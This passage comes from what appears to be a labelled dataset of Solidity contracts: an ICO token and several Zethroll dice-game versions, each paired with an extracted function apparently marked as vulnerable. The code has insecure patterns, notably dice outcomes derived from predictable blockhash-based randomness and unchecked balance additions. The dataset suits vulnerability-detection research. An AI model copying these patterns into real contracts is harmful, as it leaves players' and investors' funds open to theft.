function setTokenExchangeRate(uint256 _tokenExchangeRate) isOwner external {\n if (_tokenExchangeRate == 0) throw;\n if (_tokenExchangeRate == tokenExchangeRate) throw;\n tokenExchangeRate = _tokenExchangeRate;\n }\n function increaseSupply (uint256 _value) isOwner external {\n uint256 value = formatDecimals(_value);\n if (value + currentSupply > totalSupply) throw;\n currentSupply = safeAdd(currentSupply, value);\n IncreaseSupply(value);\n }\n function decreaseSupply (uint256 _value) isOwner external {\n uint256 value = formatDecimals(_value);\n if (value + tokenRaised > currentSupply) throw;\n currentSupply = safeSubtract(currentSupply, value);\n DecreaseSupply(value);\n }\n function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) isOwner external {\n if (isFunding) throw;\n if (_fundingStartBlock >= _fundingStopBlock) throw;\n if (block.number >= _fundingStartBlock) throw;\n fundingStartBlock = _fundingStartBlock;\n fundingStopBlock = _fundingStopBlock;\n isFunding = true;\n }\n function stopFunding() isOwner external {\n if (!isFunding) throw;\n isFunding = false;\n }\n function setMigrateContract(address _newContractAddr) isOwner external {\n if (_newContractAddr == newContractAddr) throw;\n newContractAddr = _newContractAddr;\n }\n function changeOwner(address _newFundDeposit) isOwner() external {\n if (_newFundDeposit == address(0x0)) throw;\n ethFundDeposit = _newFundDeposit;\n }\n function migrate() external {\n if(isFunding) throw;\n if(newContractAddr == address(0x0)) throw;\n uint256 tokens = balances[msg.sender];\n if (tokens == 0) throw;\n balances[msg.sender] = 0;\n tokenMigrated = safeAdd(tokenMigrated, tokens);\n IMigrationContract newContract = IMigrationContract(newContractAddr);\n if (!newContract.migrate(msg.sender, tokens)) throw;\n Migrate(msg.sender, tokens);\n }\n function transferETH() isOwner external {\n if (this.balance == 0) throw;\n if (!ethFundDeposit.send(this.balance)) throw;\n }\n function allocateToken (address _addr, uint256 _fin) isOwner public {\n if (_fin == 0) throw;\n if (_addr == address(0x0)) throw;\n uint256 tokens = safeMult(formatDecimals(_fin), tokenExchangeRate);\n if (tokens + tokenRaised > currentSupply) throw;\n tokenRaised = safeAdd(tokenRaised, tokens);\n balances[_addr] += tokens;\n AllocateToken(_addr, tokens);\n }\n function () payable {\n if (!isFunding) throw;\n if (msg.value == 0) throw;\n if (block.number < fundingStartBlock) throw;\n if (block.number > fundingStopBlock) throw;\n uint256 tokens = safeMult(msg.value, tokenExchangeRate);\n if (tokens + tokenRaised > currentSupply) throw;\n tokenRaised = safeAdd(tokenRaised, tokens);\n balances[msg.sender] += tokens;\n IssueToken(msg.sender, tokens);\n }\n}",
  "extract_feature": [
    "function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) isOwner external {\nif (isFunding) throw;\nif (_fundingStartBlock >= _fundingStopBlock) throw;\nif (block.number >= _fundingStartBlock) throw;\nfundingStartBlock = _fundingStartBlock;\nfundingStopBlock = _fundingStopBlock;\nisFunding = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b54"
  },
  "filename": "2632.sol",
  "content": "pragma solidity ^0.4.12;\ncontract IMigrationContract {\n function migrate(address addr, uint256 nas) returns (bool success);\n}\ncontract SafeMath {\n function safeAdd(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x + y;\n assert((z >= x) && (z >= y));\n return z;\n }\n function safeSubtract(uint256 x, uint256 y) internal returns(uint256) {\n assert(x >= y);\n uint256 z = x - y;\n return z;\n }\n function safeMult(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x * y;\n assert((x == 0)||(z/x == y));\n return z;\n }\n}\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract AntiFakeLabelToken is StandardToken, SafeMath {\n string public constant name = \"Anti-Fake Label\";\n string public constant symbol = \"AFL\";\n uint256 public constant decimals = 18;\n string public version = \"1.0\";\n address public ethFundDeposit;\n address public newContractAddr;\n bool public isFunding;\n uint256 public fundingStartBlock;\n uint256 public fundingStopBlock;\n uint256 public currentSupply;\n uint256 public tokenRaised = 0;\n uint256 public tokenMigrated = 0;\n uint256 public tokenExchangeRate = 3500;\n event AllocateToken(address indexed _to, uint256 _value);\n event IssueToken(address indexed _to, uint256 _value);\n event IncreaseSupply(uint256 _value);\n event DecreaseSupply(uint256 _value);\n event Migrate(address indexed _to, uint256 _value);\n function formatDecimals(uint256 _value) internal returns (uint256 ) {\n return _value * 10 ** decimals;\n }\n function AntiFakeLabelToken(\n address _ethFundDeposit,\n uint256 _currentSupply)\n {\n ethFundDeposit = _ethFundDeposit;\n isFunding = false;\n fundingStartBlock = 0;\n fundingStopBlock = 0;\n currentSupply = formatDecimals(_currentSupply);\n totalSupply = formatDecimals(5000000000);\n balances[msg.sender] = totalSupply;\n if(currentSupply > totalSupply) throw;\n }\n modifier isOwner() { require(msg.sender == ethFundDeposit); _; }\n function setTokenExchangeRate(uint256 _tokenExchangeRate) isOwner external {\n if (_tokenExchangeRate == 0) throw;\n if (_tokenExchangeRate == tokenExchangeRate) throw;\n tokenExchangeRate = _tokenExchangeRate;\n }\n function increaseSupply (uint256 _value) isOwner external {\n uint256 value = formatDecimals(_value);\n if (value + currentSupply > totalSupply) throw;\n currentSupply = safeAdd(currentSupply, value);\n IncreaseSupply(value);\n }\n function decreaseSupply (uint256 _value) isOwner external {\n uint256 value = formatDecimals(_value);\n if (value + tokenRaised > currentSupply) throw;\n currentSupply = safeSubtract(currentSupply, value);\n DecreaseSupply(value);\n }\n function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) isOwner external {\n if (isFunding) throw;\n if (_fundingStartBlock >= _fundingStopBlock) throw;\n if (block.number >= _fundingStartBlock) throw;\n fundingStartBlock = _fundingStartBlock;\n fundingStopBlock = _fundingStopBlock;\n isFunding = true;\n }\n function stopFunding() isOwner external {\n if (!isFunding) throw;\n isFunding = false;\n }\n function setMigrateContract(address _newContractAddr) isOwner external {\n if (_newContractAddr == newContractAddr) throw;\n newContractAddr = _newContractAddr;\n }\n function changeOwner(address _newFundDeposit) isOwner() external {\n if (_newFundDeposit == address(0x0)) throw;\n ethFundDeposit = _newFundDeposit;\n }\n function migrate() external {\n if(isFunding) throw;\n if(newContractAddr == address(0x0)) throw;\n uint256 tokens = balances[msg.sender];\n if (tokens == 0) throw;\n balances[msg.sender] = 0;\n tokenMigrated = safeAdd(tokenMigrated, tokens);\n IMigrationContract newContract = IMigrationContract(newContractAddr);\n if (!newContract.migrate(msg.sender, tokens)) throw;\n Migrate(msg.sender, tokens);\n }\n function transferETH() isOwner external {\n if (this.balance == 0) throw;\n if (!ethFundDeposit.send(this.balance)) throw;\n }\n function allocateToken (address _addr, uint256 _eth) isOwner external {\n if (_eth == 0) throw;\n if (_addr == address(0x0)) throw;\n uint256 tokens = safeMult(formatDecimals(_eth), tokenExchangeRate);\n if (tokens + tokenRaised > currentSupply) throw;\n tokenRaised = safeAdd(tokenRaised, tokens);\n balances[_addr] += tokens;\n AllocateToken(_addr, tokens);\n }\n function () payable {\n if (!isFunding) throw;\n if (msg.value == 0) throw;\n if (block.number < fundingStartBlock) throw;\n if (block.number > fundingStopBlock) throw;\n uint256 tokens = safeMult(msg.value, tokenExchangeRate);\n if (tokens + tokenRaised > currentSupply) throw;\n tokenRaised = safeAdd(tokenRaised, tokens);\n balances[msg.sender] += tokens;\n IssueToken(msg.sender, tokens);\n }\n}",
  "extract_feature": [
    "function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) isOwner external {\nif (isFunding) throw;\nif (_fundingStartBlock >= _fundingStopBlock) throw;\nif (block.number >= _fundingStartBlock) throw;\nfundingStartBlock = _fundingStartBlock;\nfundingStopBlock = _fundingStopBlock;\nisFunding = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b55"
  },
  "filename": "2633.sol",
  "content": "pragma solidity ^0.4.23;\ncontract ZTHReceivingContract {\n function tokenFallback(address _from, uint _value, bytes _data) public returns (bool);\n}\ncontract ZTHInterface {\n function getFrontEndTokenBalanceOf(address who) public view returns (uint);\n function transfer(address _to, uint _value) public returns (bool);\n function approve(address spender, uint tokens) public returns (bool);\n}\ncontract Zethroll is ZTHReceivingContract {\n using SafeMath for uint;\n modifier betIsValid(uint _betSize, uint _playerNumber) {\n require( calculateProfit(_betSize, _playerNumber) < maxProfit\n && _betSize >= minBet\n && _playerNumber > minNumber\n && _playerNumber < maxNumber);\n _;\n }\n modifier gameIsActive {\n require(gamePaused == false);\n _;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n uint constant private MAX_INT = 2 ** 256 - 1;\n uint constant public maxProfitDivisor = 1000000;\n uint constant public maxNumber = 100;\n uint constant public minNumber = 2;\n uint constant public houseEdgeDivisor = 1000;\n bool public gamePaused;\n address public owner;\n address public ZethrBankroll;\n address public ZTHTKNADDR;\n ZTHInterface public ZTHTKN;\n uint public contractBalance;\n uint public houseEdge;\n uint public maxProfit;\n uint public maxProfitAsPercentOfHouse;\n uint public minBet = 0;\n uint public totalBets;\n uint public totalZTHWagered;\n event LogBet(address sender, uint value, uint rollUnder);\n event LogResult(address player, uint result, uint rollUnder, uint profit, uint tokensBetted, bool won);\n event LogOwnerTransfer(address indexed SentToAddress, uint indexed AmountTransferred);\n event MaxProfitChanged(uint _oldMaxProfit, uint _newMaxProfit);\n event CurrentContractBalance(uint _tokens);\n constructor (address zthtknaddr, address zthbankrolladdr) public {\n owner = msg.sender;\n ZTHTKN = ZTHInterface(zthtknaddr);\n ZTHTKNADDR = zthtknaddr;\n ZethrBankroll = zthbankrolladdr;\n houseEdge = 990;\n ownerSetMaxProfitAsPercentOfHouse(10000);\n ownerSetMinBet(1e18);\n ZTHTKN.approve(zthbankrolladdr, MAX_INT);\n }\n function() public payable {}\n function maxRandom(uint blockn, address entropy) public view returns (uint256 randomNumber) {\n return uint256(keccak256(\n abi.encodePacked(\n blockhash(blockn),\n entropy)\n ));\n }\n function random(uint256 upper, uint256 blockn, address entropy) internal view returns (uint256 randomNumber) {\n return maxRandom(blockn, entropy) % upper;\n }\n function calculateProfit(uint _initBet, uint _roll)\n private\n view\n returns (uint)\n {\n return ((((_initBet * (101 - (_roll.sub(1)))) / (_roll.sub(1)) + _initBet)) * houseEdge / houseEdgeDivisor) - _initBet;\n }\n struct playerRoll{\n uint200 tokenValue;\n uint48 blockn;\n uint8 rollUnder;\n }\n mapping(address => playerRoll) public playerRolls;\n function _playerRollDice(uint _rollUnder, TKN _tkn) private\n gameIsActive\n betIsValid(_tkn.value, _rollUnder)\n {\n require(_tkn.value < ((2 ** 200) - 1));\n require(block.number < ((2 ** 48) - 1));\n require(_zthToken(msg.sender));\n playerRoll memory roll = playerRolls[_tkn.sender];\n require(block.number != roll.blockn);\n if (roll.blockn != 0) {\n _finishBet(false, _tkn.sender);\n }\n roll.blockn = uint40(block.number);\n roll.tokenValue = uint200(_tkn.value);\n roll.rollUnder = uint8(_rollUnder);\n playerRolls[_tkn.sender] = roll;\n emit LogBet(_tkn.sender, _tkn.value, _rollUnder);\n totalBets += 1;\n totalZTHWagered += _tkn.value;\n }\n function finishBet() public\n gameIsActive\n {\n _finishBet(true, msg.sender);\n }\n function _finishBet(bool delete_it, address target) private {\n playerRoll memory roll = playerRolls[target];\n require(roll.tokenValue > 0);\n uint result;\n if (block.number - roll.blockn > 255) {\n result = 1000;\n } else {\n result = random(100, roll.blockn, target) + 1;\n }\n uint rollUnder = roll.rollUnder;\n if (result < rollUnder) {\n uint profit = calculateProfit(roll.tokenValue, rollUnder);\n contractBalance = contractBalance.sub(profit);\n emit LogResult(target, result, rollUnder, profit, roll.tokenValue, true);\n setMaxProfit();\n if (delete_it){\n delete playerRolls[target];\n }\n ZTHTKN.transfer(target, profit + roll.tokenValue);\n } else {\n emit LogResult(target, result, rollUnder, profit, roll.tokenValue, false);\n contractBalance = contractBalance.add(roll.tokenValue);\n setMaxProfit();\n }\n }\n struct TKN {address sender; uint value;}\n function tokenFallback(address _from, uint _value, bytes _data) public returns (bool) {\n if (_from == ZethrBankroll) {\n contractBalance = contractBalance.add(_value);\n uint oldMaxProfit = maxProfit;\n setMaxProfit();\n emit MaxProfitChanged(oldMaxProfit, maxProfit);\n return true;\n } else {\n TKN memory _tkn;\n _tkn.sender = _from;\n _tkn.value = _value;\n uint8 chosenNumber = uint8(_data[0]);\n _playerRollDice(chosenNumber, _tkn);\n }\n return true;\n }\n function setMaxProfit() internal {\n emit CurrentContractBalance(contractBalance);\n maxProfit = (contractBalance * maxProfitAsPercentOfHouse) / maxProfitDivisor;\n }\n function ownerUpdateContractBalance(uint newContractBalance) public\n onlyOwner\n {\n contractBalance = newContractBalance;\n }\n function ownerSetMaxProfitAsPercentOfHouse(uint newMaxProfitAsPercent) public\n onlyOwner\n {\n require(newMaxProfitAsPercent <= 200000);\n maxProfitAsPercentOfHouse = newMaxProfitAsPercent;\n setMaxProfit();\n }\n function ownerSetMinBet(uint newMinimumBet) public\n onlyOwner\n {\n minBet = newMinimumBet;\n }\n function ownerTransferZTH(address sendTo, uint amount) public\n onlyOwner\n {\n contractBalance = contractBalance.sub(amount);\n setMaxProfit();\n require(ZTHTKN.transfer(sendTo, amount));\n emit LogOwnerTransfer(sendTo, amount);\n }\n function ownerPauseGame(bool newStatus) public\n onlyOwner\n {\n gamePaused = newStatus;\n }\n function ownerSetBankroll(address newBankroll) public\n onlyOwner\n {\n ZTHTKN.approve(ZethrBankroll, 0);\n ZethrBankroll = newBankroll;\n ZTHTKN.approve(newBankroll, MAX_INT);\n }\n function ownerChangeOwner(address newOwner) public\n onlyOwner\n {\n owner = newOwner;\n }\n function ownerkill() public\n onlyOwner\n {\n ZTHTKN.transfer(owner, contractBalance);\n selfdestruct(owner);\n }\n function dumpdivs() public{\n ZethrBankroll.transfer(address(this).balance);\n }\n function _zthToken(address _tokenContract) private view returns (bool) {\n return _tokenContract == ZTHTKNADDR;\n }\n}\nlibrary SafeMath {\n function mul(uint a, uint b) internal pure returns (uint) {\n if (a == 0) {\n return 0;\n }\n uint c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint a, uint b) internal pure returns (uint) {\n uint c = a / b;\n return c;\n }\n function sub(uint a, uint b) internal pure returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal pure returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function _finishBet(bool delete_it, address target) private {\nplayerRoll memory roll = playerRolls[target];\nrequire(roll.tokenValue > 0);\nuint result;\nif (block.number - roll.blockn > 255) {\nresult = 1000;\n} else {\nresult = random(100, roll.blockn, target) + 1;\n}\nuint rollUnder = roll.rollUnder;\nif (result < rollUnder) {\nuint profit = calculateProfit(roll.tokenValue, rollUnder);\ncontractBalance = contractBalance.sub(profit);\nemit LogResult(target, result, rollUnder, profit, roll.tokenValue, true);\nsetMaxProfit();\nif (delete_it){\ndelete playerRolls[target];\n}\nZTHTKN.transfer(target, profit + roll.tokenValue);\n} else {\nemit LogResult(target, result, rollUnder, profit, roll.tokenValue, false);\ncontractBalance = contractBalance.add(roll.tokenValue);\nsetMaxProfit();\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6a750a970a4fdc0b56"
  },
  "filename": "2638.sol",
  "content": "pragma solidity ^0.4.23;\ncontract ZTHReceivingContract {\n function tokenFallback(address _from, uint _value, bytes _data) public returns (bool);\n}\ncontract ZTHInterface {\n function getFrontEndTokenBalanceOf(address who) public view returns (uint);\n function transfer(address _to, uint _value) public returns (bool);\n function approve(address spender, uint tokens) public returns (bool);\n}\ncontract Zethroll is ZTHReceivingContract {\n using SafeMath for uint;\n modifier betIsValid(uint _betSize, uint _playerNumber) {\n require( calculateProfit(_betSize, _playerNumber) < maxProfit\n && _betSize >= minBet\n && _playerNumber > minNumber\n && _playerNumber < maxNumber);\n _;\n }\n modifier gameIsActive {\n require(gamePaused == false);\n _;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n uint constant private MAX_INT = 2 ** 256 - 1;\n uint constant public maxProfitDivisor = 1000000;\n uint constant public maxNumber = 100;\n uint constant public minNumber = 2;\n uint constant public houseEdgeDivisor = 1000;\n bool public gamePaused;\n address public owner;\n address public ZethrBankroll;\n address public ZTHTKNADDR;\n ZTHInterface public ZTHTKN;\n uint public contractBalance;\n uint public houseEdge;\n uint public maxProfit;\n uint public maxProfitAsPercentOfHouse;\n uint public minBet = 0;\n uint public totalBets;\n uint public totalZTHWagered;\n event LogBet(address sender, uint value, uint rollUnder);\n event LogResult(address player, uint result, uint rollUnder, uint profit, uint tokensBetted, bool won);\n event LogOwnerTransfer(address indexed SentToAddress, uint indexed AmountTransferred);\n event MaxProfitChanged(uint _oldMaxProfit, uint _newMaxProfit);\n event CurrentContractBalance(uint _tokens);\n constructor (address zthtknaddr, address zthbankrolladdr) public {\n owner = msg.sender;\n ZTHTKN = ZTHInterface(zthtknaddr);\n ZTHTKNADDR = zthtknaddr;\n ZethrBankroll = zthbankrolladdr;\n houseEdge = 990;\n ownerSetMaxProfitAsPercentOfHouse(10000);\n ownerSetMinBet(1e18);\n ZTHTKN.approve(zthbankrolladdr, MAX_INT);\n }\n function() public payable {}\n function maxRandom(uint blockn, address entropy) public view returns (uint256 randomNumber) {\n return uint256(keccak256(\n abi.encodePacked(\n blockhash(blockn),\n entropy)\n ));\n }\n function random(uint256 upper, uint256 blockn, address entropy) internal view returns (uint256 randomNumber) {\n return maxRandom(blockn, entropy) % upper;\n }\n function calculateProfit(uint _initBet, uint _roll)\n private\n view\n returns (uint)\n {\n return ((((_initBet * (101 - (_roll.sub(1)))) / (_roll.sub(1)) + _initBet)) * houseEdge / houseEdgeDivisor) - _initBet;\n }\n struct playerRoll{\n uint200 tokenValue;\n uint48 blockn;\n uint8 rollUnder;\n }\n mapping(address => playerRoll) public playerRolls;\n function _playerRollDice(uint _rollUnder, TKN _tkn) private\n gameIsActive\n betIsValid(_tkn.value, _rollUnder)\n {\n require(_tkn.value < ((2 ** 200) - 1));\n require(block.number < ((2 ** 48) - 1));\n require(_zthToken(msg.sender));\n playerRoll memory roll = playerRolls[_tkn.sender];\n require(block.number != roll.blockn);\n if (roll.blockn != 0) {\n _finishBet(false, _tkn.sender);\n }\n roll.blockn = uint40(block.number);\n roll.tokenValue = uint200(_tkn.value);\n roll.rollUnder = uint8(_rollUnder);\n playerRolls[_tkn.sender] = roll;\n emit LogBet(_tkn.sender, _tkn.value, _rollUnder);\n totalBets += 1;\n totalZTHWagered += _tkn.value;\n }\n function finishBet() public\n gameIsActive\n {\n _finishBet(true, msg.sender);\n }\n function _finishBet(bool delete_it, address target) private {\n playerRoll memory roll = playerRolls[target];\n require(roll.tokenValue > 0);\n uint result;\n if (block.number - roll.blockn > 255) {\n result = 1000;\n } else {\n result = random(100, roll.blockn, target) + 1;\n }\n uint rollUnder = roll.rollUnder;\n if (result < rollUnder) {\n uint profit = calculateProfit(roll.tokenValue, rollUnder);\n contractBalance = contractBalance.sub(profit);\n emit LogResult(target, result, rollUnder, profit, roll.tokenValue, true);\n setMaxProfit();\n if (delete_it){\n delete playerRolls[target];\n }\n ZTHTKN.transfer(target, profit + roll.tokenValue);\n } else {\n emit LogResult(target, result, rollUnder, profit, roll.tokenValue, false);\n contractBalance = contractBalance.add(roll.tokenValue);\n setMaxProfit();\n }\n }\n struct TKN {address sender; uint value;}\n function tokenFallback(address _from, uint _value, bytes _data) public returns (bool) {\n if (_from == ZethrBankroll) {\n contractBalance = contractBalance.add(_value);\n uint oldMaxProfit = maxProfit;\n setMaxProfit();\n emit MaxProfitChanged(oldMaxProfit, maxProfit);\n return true;\n } else {\n TKN memory _tkn;\n _tkn.sender = _from;\n _tkn.value = _value;\n uint chosenNumber = uint(_data[0]);\n _playerRollDice(chosenNumber, _tkn);\n }\n return true;\n }\n function setMaxProfit() internal {\n emit CurrentContractBalance(contractBalance);\n maxProfit = (contractBalance * maxProfitAsPercentOfHouse) / maxProfitDivisor;\n }\n function ownerUpdateContractBalance(uint newContractBalance) public\n onlyOwner\n {\n contractBalance = newContractBalance;\n }\n function ownerSetMaxProfitAsPercentOfHouse(uint newMaxProfitAsPercent) public\n onlyOwner\n {\n require(newMaxProfitAsPercent <= 200000);\n maxProfitAsPercentOfHouse = newMaxProfitAsPercent;\n setMaxProfit();\n }\n function ownerSetMinBet(uint newMinimumBet) public\n onlyOwner\n {\n minBet = newMinimumBet;\n }\n function ownerTransferZTH(address sendTo, uint amount) public\n onlyOwner\n {\n contractBalance = contractBalance.sub(amount);\n setMaxProfit();\n require(ZTHTKN.transfer(sendTo, amount));\n emit LogOwnerTransfer(sendTo, amount);\n }\n function ownerPauseGame(bool newStatus) public\n onlyOwner\n {\n gamePaused = newStatus;\n }\n function ownerSetBankroll(address newBankroll) public\n onlyOwner\n {\n ZTHTKN.approve(ZethrBankroll, 0);\n ZethrBankroll = newBankroll;\n ZTHTKN.approve(newBankroll, MAX_INT);\n }\n function ownerChangeOwner(address newOwner) public\n onlyOwner\n {\n owner = newOwner;\n }\n function ownerkill() public\n onlyOwner\n {\n ZTHTKN.transfer(owner, contractBalance);\n selfdestruct(owner);\n }\n function dumpdivs() public{\n ZethrBankroll.transfer(address(this).balance);\n }\n function _zthToken(address _tokenContract) private view returns (bool) {\n return _tokenContract == ZTHTKNADDR;\n }\n}\nlibrary SafeMath {\n function mul(uint a, uint b) internal pure returns (uint) {\n if (a == 0) {\n return 0;\n }\n uint c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint a, uint b) internal pure returns (uint) {\n uint c = a / b;\n return c;\n }\n function sub(uint a, uint b) internal pure returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal pure returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function _finishBet(bool delete_it, address target) private {\nplayerRoll memory roll = playerRolls[target];\nrequire(roll.tokenValue > 0);\nuint result;\nif (block.number - roll.blockn > 255) {\nresult = 1000;\n} else {\nresult = random(100, roll.blockn, target) + 1;\n}\nuint rollUnder = roll.rollUnder;\nif (result < rollUnder) {\nuint profit = calculateProfit(roll.tokenValue, rollUnder);\ncontractBalance = contractBalance.sub(profit);\nemit LogResult(target, result, rollUnder, profit, roll.tokenValue, true);\nsetMaxProfit();\nif (delete_it){\ndelete playerRolls[target];\n}\nZTHTKN.transfer(target, profit + roll.tokenValue);\n} else {\nemit LogResult(target, result, rollUnder, profit, roll.tokenValue, false);\ncontractBalance = contractBalance.add(roll.tokenValue);\nsetMaxProfit();\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6a750a970a4fdc0b57"
  },
  "filename": "2658.sol",
  "content": "pragma solidity ^0.4.23;\ncontract ZTHReceivingContract {\n function tokenFallback(address _from, uint _value, bytes _data) public returns (bool);\n}\ncontract ZTHInterface {\n function getFrontEndTokenBalanceOf(address who) public view returns (uint);\n function transfer(address _to, uint _value) public returns (bool);\n function approve(address spender, uint tokens) public returns (bool);\n}\ncontract Zethroll is ZTHReceivingContract {\n using SafeMath for uint;\n modifier betIsValid(uint _betSize, uint _playerNumber) {\n require( calculateProfit(_betSize, _playerNumber) < maxProfit\n && _betSize >= minBet\n && _playerNumber > minNumber\n && _playerNumber < maxNumber);\n _;\n }\n modifier gameIsActive {\n require(gamePaused == false);\n _;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n uint constant private MAX_INT = 2 ** 256 - 1;\n uint constant public maxProfitDivisor = 1000000;\n uint constant public maxNumber = 100;\n uint constant public minNumber = 2;\n uint constant public houseEdgeDivisor = 1000;\n bool public gamePaused;\n address public owner;\n address public bankroll;\n address public ZTHTKNADDR;\n ZTHInterface public ZTHTKN;\n uint public contractBalance;\n uint public houseEdge;\n uint public maxProfit;\n uint public maxProfitAsPercentOfHouse;\n uint public minBet = 0;\n event LogBet(address sender, uint value, uint rollUnder);\n event LogResult(address player, uint result, uint rollUnder, uint profit, uint tokensBetted, bool won);\n event LogOwnerTransfer(address indexed SentToAddress, uint indexed AmountTransferred);\n event MaxProfitChanged(uint _oldMaxProfit, uint _newMaxProfit);\n event CurrentContractBalance(uint _tokens);\n address ZethrBankroll;\n constructor (address zthtknaddr, address zthbankrolladdr) public {\n owner = msg.sender;\n ZTHTKN = ZTHInterface(zthtknaddr);\n ZTHTKNADDR = zthtknaddr;\n ZethrBankroll = zthbankrolladdr;\n houseEdge = 990;\n ownerSetMaxProfitAsPercentOfHouse(10000);\n ownerSetMinBet(1e18);\n ZTHTKN.approve(zthbankrolladdr, MAX_INT);\n bankroll = zthbankrolladdr;\n }\n function() public payable {}\n function maxRandom(uint blockn, address entropy) public view returns (uint256 randomNumber) {\n return uint256(keccak256(\n abi.encodePacked(\n blockhash(blockn),\n entropy)\n ));\n }\n function random(uint256 upper, uint256 blockn, address entropy) internal view returns (uint256 randomNumber) {\n return maxRandom(blockn, entropy) % upper;\n }\n function calculateProfit(uint _initBet, uint _roll)\n private\n view\n returns (uint)\n {\n return ((((_initBet * (101 - (_roll.sub(1)))) / (_roll.sub(1)) + _initBet)) * houseEdge / houseEdgeDivisor) - _initBet;\n }\n event Debug(uint a, string b);\n struct playerRoll{\n uint200 tokenValue;\n uint48 blockn;\n uint8 rollUnder;\n }\n mapping(address => playerRoll) public playerRolls;\n function _playerRollDice(uint _rollUnder, TKN _tkn) private\n gameIsActive\n betIsValid(_tkn.value, _rollUnder)\n {\n require(_tkn.value < ((2 ** 200) - 1));\n require(block.number < ((2 ** 48) - 1));\n require(_zthToken(msg.sender));\n playerRoll memory roll = playerRolls[_tkn.sender];\n require(block.number != roll.blockn);\n if (roll.blockn != 0) {\n _finishBet(false, _tkn.sender);\n }\n roll.blockn = uint40(block.number);\n roll.tokenValue = uint200(_tkn.value);\n roll.rollUnder = uint8(_rollUnder);\n playerRolls[_tkn.sender] = roll;\n emit LogBet(_tkn.sender, _tkn.value, _rollUnder);\n }\n function finishBet() public\n gameIsActive\n {\n _finishBet(true, msg.sender);\n }\n function _finishBet(bool delete_it, address target) private {\n playerRoll memory roll = playerRolls[target];\n require(roll.tokenValue > 0);\n uint result;\n if (block.number - roll.blockn > 255) {\n result = 1000;\n } else {\n result = random(100, roll.blockn, target) + 1;\n }\n uint rollUnder = roll.rollUnder;\n if (result < rollUnder) {\n uint profit = calculateProfit(roll.tokenValue, rollUnder);\n contractBalance = contractBalance.sub(profit);\n emit LogResult(target, result, rollUnder, profit, roll.tokenValue, true);\n setMaxProfit();\n if (delete_it){\n delete playerRolls[target];\n }\n ZTHTKN.transfer(target, profit + roll.tokenValue);\n } else {\n emit LogResult(target, result, rollUnder, profit, roll.tokenValue, false);\n contractBalance = contractBalance.add(roll.tokenValue);\n setMaxProfit();\n }\n }\n struct TKN {address sender; uint value;}\n function tokenFallback(address _from, uint _value, bytes _data) public returns (bool) {\n if (_from == bankroll) {\n contractBalance = contractBalance.add(_value);\n uint oldMaxProfit = maxProfit;\n setMaxProfit();\n emit MaxProfitChanged(oldMaxProfit, maxProfit);\n return true;\n } else {\n TKN memory _tkn;\n _tkn.sender = _from;\n _tkn.value = _value;\n uint chosenNumber = uint(_data[0]);\n _playerRollDice(chosenNumber, _tkn);\n }\n return true;\n }\n function setMaxProfit() internal {\n emit CurrentContractBalance(contractBalance);\n maxProfit = (contractBalance * maxProfitAsPercentOfHouse) / maxProfitDivisor;\n }\n function ownerUpdateContractBalance(uint newContractBalance) public\n onlyOwner\n {\n contractBalance = newContractBalance;\n }\n function ownerSetMaxProfitAsPercentOfHouse(uint newMaxProfitAsPercent) public\n onlyOwner\n {\n require(newMaxProfitAsPercent <= 10000);\n maxProfitAsPercentOfHouse = newMaxProfitAsPercent;\n setMaxProfit();\n }\n function ownerSetMinBet(uint newMinimumBet) public\n onlyOwner\n {\n minBet = newMinimumBet;\n }\n function ownerTransferZTH(address sendTo, uint amount) public\n onlyOwner\n {\n contractBalance = contractBalance.sub(amount);\n setMaxProfit();\n require(ZTHTKN.transfer(sendTo, amount));\n emit LogOwnerTransfer(sendTo, amount);\n }\n function ownerPauseGame(bool newStatus) public\n onlyOwner\n {\n gamePaused = newStatus;\n }\n function ownerSetBankroll(address newBankroll) public\n onlyOwner\n {\n ZTHTKN.approve(bankroll, 0);\n bankroll = newBankroll;\n ZTHTKN.approve(newBankroll, MAX_INT);\n }\n function ownerChangeOwner(address newOwner) public\n onlyOwner\n {\n owner = newOwner;\n 